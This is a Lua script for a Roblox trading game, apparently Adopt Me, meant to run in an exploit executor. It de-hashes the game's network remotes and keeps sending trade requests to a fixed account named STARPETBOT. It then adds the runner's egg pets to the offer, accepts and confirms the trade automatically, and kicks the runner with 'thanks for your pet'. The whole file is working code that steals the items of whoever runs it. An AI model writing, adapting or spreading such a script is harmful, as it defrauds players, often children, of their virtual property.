local G = getgenv and getgenv() or _G or shared
G.Get = setmetatable({}, {__index = function(A, B) return game:GetService(B) end})
for i,v in pairs(game.GetChildren(game)) do
    G[v.ClassName] = v
end
G.Player = Players.LocalPlayer
G.wait = task.wait
G.spawn = task.spawn
G.Heartbeat = RunService.Heartbeat
G.Stepped = RunService.Stepped
G.RenderStepped = RunService.RenderStepped
G.Error = ScriptContext.Error
G.MessageOut = LogService.MessageOut
G.Kick = Player.Kick
G.Idled = Player.Idled

local function rename(remotename,hashedremote)
    hashedremote.Name = remotename
end

table.foreach(getupvalue(require(game:GetService("ReplicatedStorage"):WaitForChild("Fsys")).load("RouterClient").init,4),rename)
repeat
    wait(1)
    local args = {
        [1] = game:GetService("Players"):WaitForChild(STARPETBOT)
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/SendTradeRequest"):FireServer(unpack(args))
until Player.PlayerGui.TradeApp.Frame.Visible
if Player.PlayerGui.TradeApp.Frame.Visible then
    for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.pets) do
        if v["id"]:find("egg") and not v["id"]:find("_2022") then
            ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
        end 
    end
end
wait(7)
game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AcceptNegotiation"):FireServer()
repeat
    wait(1)
until game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Frame.Visible and
      game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Frame.ConfirmationFrame.TradeIcon.Countdown.Visible and
      game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Frame.ConfirmationFrame.TradeIcon.Countdown.Text == "1"
wait(2)
game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/ConfirmTrade"):FireServer()
repeat
    wait(1)
until not Player.PlayerGui.TradeApp.Frame.Visible
wait(1)
game.Players.LocalPlayer:Kick("thanks for your pet, diw")
